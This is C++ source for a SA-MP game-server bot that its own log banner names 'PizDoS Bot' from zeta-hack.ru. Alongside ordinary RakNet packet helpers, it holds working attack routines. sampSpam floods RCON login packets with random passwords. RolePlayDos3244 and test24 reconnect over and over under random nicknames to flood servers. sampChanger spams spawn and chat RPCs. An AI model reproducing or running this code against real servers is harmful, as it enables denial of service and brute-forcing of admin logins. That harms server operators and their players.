#include "main.h"

void sampChanger(int iClass)
{
RakNet::BitStream bsSpawnRequest;
bsSpawnRequest.Write(rand()%7);
RakNet::BitStream bsDeath;
RakNet::BitStream bsSendSpawn;
pRakClient->RPC(&RPC_RequestClass, &bsSpawnRequest, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_RequestSpawn, &bsDeath, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);	
pRakClient->RPC(&RPC_Spawn, &bsSendSpawn, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
char chang[30];
SendMessage(changer, WM_GETTEXT, (WPARAM)512, (LPARAM)chang);
sendChat(chang);
}

// following functions
void onFootUpdateAtNormalPos()
{
	ONFOOT_SYNC_DATA ofSync;
	memset(&ofSync, 0, sizeof(ONFOOT_SYNC_DATA));
	ofSync.byteHealth = 100;
	ofSync.fQuaternion[3] = settings.fNormalModeRot;
	ofSync.vecPos[0] = settings.fNormalModePos[0];
	ofSync.vecPos[1] = settings.fNormalModePos[1];
	ofSync.vecPos[2] = settings.fNormalModePos[2];
	SendOnFootFullSyncData(&ofSync, 0, -1);

	AIM_SYNC_DATA aimSync;
	memset(&aimSync, 0, sizeof(AIM_SYNC_DATA));
	aimSync.byteCamMode = 4;
	aimSync.vecAimf1[1] = 0.25f;
	SendAimSyncData(&aimSync, 0, 0, -1);
}

void onFootUpdateFollow(PLAYERID followID)
{
	ONFOOT_SYNC_DATA ofSync;
	memset(&ofSync, 0, sizeof(ONFOOT_SYNC_DATA));
	SendOnFootFullSyncData(&ofSync, 0, followID);

	AIM_SYNC_DATA aimSync;
	memset(&aimSync, 0, sizeof(AIM_SYNC_DATA));
	SendAimSyncData(&aimSync, 0, 0, followID);
}

void onFootUpdateFollowq(PLAYERID followID)
{
	ONFOOT_SYNC_DATA ofSync;
	memset(&ofSync, 0, sizeof(ONFOOT_SYNC_DATA));
	SendOnFootFullSyncDataq(&ofSync, 0, followID);

	AIM_SYNC_DATA aimSync;
	memset(&aimSync, 0, sizeof(AIM_SYNC_DATA));
	SendAimSyncData(&aimSync, 0, 0, followID);
}

DWORD inCarUpdateTick = GetTickCount();
void inCarUpdateFollow(PLAYERID followID, VEHICLEID withVehicleID)
{
	if(playerInfo[g_myPlayerID].iAreWeInAVehicle)
	{
		INCAR_SYNC_DATA icSync;
		memset(&icSync, 0, sizeof(INCAR_SYNC_DATA));
		icSync.VehicleID = withVehicleID;
		SendInCarFullSyncData(&icSync, 0, followID);

		AIM_SYNC_DATA aimSync;
		memset(&aimSync, 0, sizeof(AIM_SYNC_DATA));
		SendAimSyncData(&aimSync, 0, 0, followID);
	}

	if(inCarUpdateTick && inCarUpdateTick < (GetTickCount() - 10000))
	{
		if(!playerInfo[g_myPlayerID].iAreWeInAVehicle)
		{
			if(playerInfo[followID].incarData.VehicleID == (VEHICLEID)-1)
				return;

			SendEnterVehicleNotification((VEHICLEID)settings.iFollowingWithVehicleID, 0);
			playerInfo[g_myPlayerID].iAreWeInAVehicle = 1;
			inCarUpdateTick = 0;
		}

		inCarUpdateTick = GetTickCount();
	}
	else
	{
		if(!playerInfo[g_myPlayerID].iAreWeInAVehicle)
			onFootUpdateFollow(followID);
	}
}

int sampConnect(char *szHostname, int iPort, char *szNickname, char *szPassword)
{
	static bool started = false;
	 
	    if (!started)
        {
	        started = true;
			Log("============================================================");
			Log("=========================PizDoS Bot=========================");
			Log("======================www.zeta-hack.ru======================");
			Log("======================Made by : AlexDrift====================");
			Log("======================Private Edition v2.2======================");
			Log("======================Testers : VegaZ, AlexWill, Effect, =======");
			Log("====================== Vladimir_Makarevich ===============");
			Log("=============================================================");
	    }
	Log("Подключение по %s:%d", szHostname, iPort);

	strcpy(g_szNickName, szNickname);
	if(pRakClient == NULL) return 0;

	pRakClient->SetPassword(szPassword);
	return (int)pRakClient->Connect(szHostname, iPort, 0, 0, 5);
}

void sampDisconnect(int iTimeout)
{
	if(pRakClient == NULL) return;

	Log("Выход");

	if(iTimeout)
		pRakClient->Disconnect(0);
	else
		pRakClient->Disconnect(500);
}

void sampRequestClass(int iClass)
{
	if(pRakClient == NULL) return;
	Log("Выбор скина %d...", iClass);

	RakNet::BitStream bsSpawnRequest;
	bsSpawnRequest.Write(iClass);
	pRakClient->RPC(&RPC_RequestClass, &bsSpawnRequest, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
}

void sampSpawn()
{
	if(pRakClient == NULL) return;

	Log("Спавн...");

#ifndef SAMP_03c
	RakNet::BitStream bsSendRequestSpawn;
	pRakClient->RPC(&RPC_RequestSpawn, &bsSendRequestSpawn, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
#endif
	RakNet::BitStream bsSendSpawn;
	pRakClient->RPC(&RPC_Spawn, &bsSendSpawn, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
}

DWORD spamTimeDisconnect = GetTickCount();
DWORD spamTimeSpam = GetTickCount();
void sampSpam()
{        
	static int time = 300;
	if (GetTickCount() - rand()%400 > time)
	{
	#define MAX_RCON_LEN 512
		char szRcon[MAX_RCON_LEN + 1] = "login ";
		static int ooo = 1;
	for ( int i = 0; i < ooo; i++)
		szRcon[i + 6] = 33 + rand()%95;

	ooo++;
	
	if ( ooo > MAX_RCON_LEN - 6 ) ooo = 1;
		RakNet::BitStream ls;
	unsigned long len = strlen(szRcon);
	ls.Write((BYTE)ID_RCON_COMMAND);
	ls.Write(MAX_RCON_LEN);
	ls.Write(szRcon, len);
	pRakClient->Send(&ls, PacketPriority(rand()%3+1), RELIABLE, 0);
	time = GetTickCount();
	}}

void test()
{
int i;
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);  
}

void test24()
{
	static int time = 0;
	if (GetTickCount() - 700 > time)
	{
		gen_random(g_szNickName, rand()%16+3);
	sampDisconnect(0);
		resetPools(2, 0);
		SendExitVehicleNotification(0xFFFFF);
	time = GetTickCount();
	}}

void RolePlayDos3244() 
{
  DWORD spamTimeDisconnect = GetTickCount();
        DWORD spamTimeSpam = GetTickCount();
	 pRakClient = RakNetworkFactory::GetRakClientInterface();
	if (iGameInited && GetTickCount() - spamTimeSpam >= settings.ispamtime) {
		spamTimeSpam = GetTickCount();
	}

	if (GetTickCount() - spamTimeDisconnect >= settings.ispamrejointime) {
		gen_random(g_szNickName, rand()%16+3);
		iGettingNewName = true;
		sampDisconnect(0);
		resetPools(1, 1);
		spamTimeDisconnect = GetTickCount();
	}
}


void sendServerCommand(char *szCommand)
{
	if (!strnicmp(szCommand+1, "rcon", 4))
	{
		RakNet::BitStream bsSend;
		bsSend.Write((BYTE)ID_RCON_COMMAND);
		DWORD len = strlen(szCommand+4);
		if (len > 0) {	
			bsSend.Write(len);
			bsSend.Write(szCommand+6, len);
		} else {
			bsSend.Write(len);
			bsSend.Write(szCommand+5, len);
		}
		pRakClient->Send(&bsSend, HIGH_PRIORITY, RELIABLE, 0);
	}
	else
	{
		RakNet::BitStream bsParams;
		int iStrlen = strlen(szCommand);
		bsParams.Write(iStrlen);
		bsParams.Write(szCommand, iStrlen);
		pRakClient->RPC(&RPC_ServerCommand, &bsParams, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
	}
}

void sendChat(char *szMessage)
{
	RakNet::BitStream bsSend;
	BYTE byteTextLen = strlen(szMessage);
	bsSend.Write(byteTextLen);
	bsSend.Write(szMessage, byteTextLen);
	pRakClient->RPC(&RPC_Chat, &bsSend, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
}

void SendScmEvent(int iEventType, DWORD dwParam1, DWORD dwParam2, DWORD dwParam3)
{
	RakNet::BitStream bsSend;
	bsSend.Write(iEventType);
	bsSend.Write(dwParam1);
	bsSend.Write(dwParam2);
	bsSend.Write(dwParam3);
	pRakClient->RPC(&RPC_ScmEvent, &bsSend, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
}

void sendDialogResponse(WORD wDialogID, BYTE bButtonID, WORD wListBoxItem, char *szInputResp)
{
	BYTE respLen = (BYTE)strlen(szInputResp);
	RakNet::BitStream bsSend;
	bsSend.Write(wDialogID);
	bsSend.Write(bButtonID);
	bsSend.Write(wListBoxItem);
	bsSend.Write(respLen);
	bsSend.Write(szInputResp, respLen);
	pRakClient->RPC(&RPC_DialogResponse, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
}




int isPlayerConnected(PLAYERID iPlayerID)
{
	if(playerInfo[iPlayerID].iIsConnected && iPlayerID >= 0 && iPlayerID <= MAX_PLAYERS)
		return 1;

	return 0;
}

int getPlayerID(char *szPlayerName)
{
	int i;
	for(i = 0; i < MAX_PLAYERS; i++)
	{
		if(playerInfo[i].iIsConnected == 0) continue;

		if(!strcmp(playerInfo[i].szPlayerName, szPlayerName))
			return i;
	}

	return -1;
}

char *getPlayerName(PLAYERID iPlayerID)
{
	if(playerInfo[iPlayerID].iIsConnected && iPlayerID >= 0 && iPlayerID <= MAX_PLAYERS)
		return playerInfo[iPlayerID].szPlayerName;

	return 0;
}

int getPlayerPos(PLAYERID iPlayerID, float *fPos)
{
	if(!playerInfo[iPlayerID].iIsConnected) return 0;

	if(iPlayerID > 0 && iPlayerID <= MAX_PLAYERS)
	{
		memcpy(fPos, playerInfo[iPlayerID].onfootData.vecPos, sizeof(float) * 3);
		return 1;
	}

	return 0;
}

PLAYERID getPlayerIDFromPlayerName(char *szName)
{
	for(int i = 0; i < MAX_PLAYERS; i++)
	{
		if(!playerInfo[i].iIsConnected) continue;
		if(!strcmp(playerInfo[i].szPlayerName, szName))
			return (PLAYERID)i;
	}

	return -1;
}

unsigned short getPlayerCount()
{
	unsigned short count = 0;
	for(int i = 0; i < MAX_PLAYERS; i++)
	{
		if(!playerInfo[i].iIsConnected) continue;
		count++;
	}
	return count;
}

const struct vehicle_entry *gta_vehicle_get_by_id ( int id )
{
	id -= VEHICLE_LIST_ID_START;

	if ( id < 0 || id >= VEHICLE_LIST_SIZE )
		return NULL;

	return &vehicle_list[id];
}
